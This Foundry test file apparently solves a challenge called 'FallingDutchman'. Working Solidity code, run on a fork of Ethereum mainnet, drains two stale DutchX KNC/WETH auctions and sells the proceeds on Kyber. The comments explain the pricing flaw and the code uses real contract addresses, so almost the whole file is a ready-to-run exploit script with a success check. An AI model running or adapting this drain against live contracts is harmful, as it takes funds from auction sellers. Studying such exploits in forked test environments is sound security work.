// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../../src/Interfaces.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract FallingDutchman is Test {
    address user = vm.envAddress("USER_ADDRESS");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.deal(user, 0.1 ether);
    }

    function test_Solution() public {
        vm.startBroadcast(user);
        // Your solution goes here.
        //
        // DutchX runs TWO opposite auctions per pair, sharing one index. At
        // FORK_BLOCK both sides of KNC/WETH (index 1051) have run ~23.19h with
        // zero buyers, so both prices sit at ~2.3% of fair value (~43x cheap):
        //
        //   auction A  KNC -> WETH   2820.7 KNC on offer, clears for 0.1035 WETH
        //   auction B  WETH -> KNC   4.482  WETH on offer, clears for   65.1 KNC
        //
        // Total fair value trapped across both ~= 8.96 ETH. Drain both:
        //   1. buy KNC cheap in A with the 0.1 ETH seed
        //   2. spend ~65 of that KNC to CLEAR B and take all 4.482 WETH
        //   3. feed that WETH back to CLEAR A and take the remaining KNC
        //   4. dump the KNC on Kyber for ETH
        // Clearing an auction only costs DutchX's ~0.5% liquidity fee and, as the
        // sole buyer, hands us nearly the entire sellVolume. Everything is kept in
        // this block via low-level calls.
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address knc = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
        address kyber = 0x818E6FECD516Ecc3849DAf6845e3EC868087B755;
        address kyberEth = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

        (bool success, bytes memory ret) =
            DUTCHX.staticcall(abi.encodeWithSignature("getAuctionIndex(address,address)", knc, weth));
        require(success, "index failed");
        uint256 idx = abi.decode(ret, (uint256));

        // --- seed: 0.1 ETH -> WETH -> DutchX internal balance ---
        IWETH(weth).deposit{value: 0.1 ether}();
        IERC20(weth).approve(DUTCHX, 0.1 ether);
        (success,) = DUTCHX.call(abi.encodeWithSignature("deposit(address,uint256)", weth, 0.1 ether));
        require(success, "deposit failed");

        // --- 1) buy KNC cheap in auction A (partial, does not clear) ---
        (success,) = DUTCHX.call(abi.encodeWithSignature("postBuyOrder(address,address,uint256,uint256)", knc, weth, idx, 0.1 ether));
        require(success, "buy KNC failed");
        (success,) = DUTCHX.call(abi.encodeWithSignature("claimBuyerFunds(address,address,address,uint256)", knc, weth, user, idx));
        require(success, "claim KNC failed");

        // --- 2) spend ~65 KNC to CLEAR auction B, take all its WETH ---
        //     amount auto-caps to outstanding volume; only the ~0.5% liquidity fee applies.
        (success,) = DUTCHX.call(abi.encodeWithSignature("postBuyOrder(address,address,uint256,uint256)", weth, knc, idx, type(uint256).max));
        require(success, "buy WETH failed");
        (success,) = DUTCHX.call(abi.encodeWithSignature("claimBuyerFunds(address,address,address,uint256)", weth, knc, user, idx));
        require(success, "claim WETH failed");

        // --- 3) feed that WETH back to CLEAR auction A, take the rest of the KNC ---
        (success,) = DUTCHX.call(abi.encodeWithSignature("postBuyOrder(address,address,uint256,uint256)", knc, weth, idx, type(uint256).max));
        require(success, "clear KNC failed");
        (success,) = DUTCHX.call(abi.encodeWithSignature("claimBuyerFunds(address,address,address,uint256)", knc, weth, user, idx));
        require(success, "claim KNC clear failed");

        // --- pull everything out of DutchX ---
        (success,) = DUTCHX.call(abi.encodeWithSignature("withdraw(address,uint256)", weth, type(uint256).max));
        require(success, "withdraw WETH failed");
        (success,) = DUTCHX.call(abi.encodeWithSignature("withdraw(address,uint256)", knc, type(uint256).max));
        require(success, "withdraw KNC failed");
        uint256 wethBal = IERC20(weth).balanceOf(user);
        if (wethBal > 0) IWETH(weth).withdraw(wethBal);

        // --- 4) dump the KNC on Kyber for native ETH, straight to the user ---
        uint256 kncBal = IERC20(knc).balanceOf(user);
        IERC20(knc).approve(kyber, kncBal);
        (success, ret) = kyber.staticcall(abi.encodeWithSignature("getExpectedRate(address,address,uint256)", knc, kyberEth, kncBal));
        require(success, "rate failed");
        (, uint256 minRate) = abi.decode(ret, (uint256, uint256));
        (success,) = kyber.call(
            abi.encodeWithSignature(
                "trade(address,uint256,address,address,uint256,uint256,address)",
                knc, kncBal, kyberEth, user, type(uint256).max, minRate, address(0)
            )
        );
        require(success, "trade failed");

        // console.log("[result] KNC bought: %18e", kncBal);
        // console.log("[result] ending balance: %18e ETH", user.balance);
        vm.stopBroadcast();
        checkSolve();
    }

    function checkSolve() public view {
        require(user.balance >= 4 ether, "not enough ETH");
        console.log("Solved. Ending balance in ETH: %18e", user.balance);
    }
}
